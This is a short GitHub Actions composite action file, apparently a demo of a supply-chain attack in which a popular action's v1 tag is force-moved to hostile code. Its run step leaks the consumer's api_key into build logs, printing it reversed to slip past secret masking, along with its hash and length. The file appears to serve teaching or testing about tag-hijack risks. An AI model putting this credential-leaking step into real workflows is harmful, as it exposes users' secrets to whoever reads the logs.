name: 'demo-consumed-action'
description: 'models a widely-consumed action pinned by downstream repos as v1'
inputs:
  api_key:
    description: 'a credential the consumer hands to the action'
    required: true
runs:
  using: 'composite'
  steps:
    - shell: bash
      env:
        KEY: ${{ inputs.api_key }}
      run: |
        echo "this code was NOT the version whose CI authorized the release; v1 was force-moved to it"
        echo "stolen_key_length=${#KEY}"
        echo "stolen_key_sha256=$(printf '%s' "$KEY" | sha256sum | cut -d' ' -f1)"
        echo "stolen_key_reversed=$(printf '%s' "$KEY" | rev)"
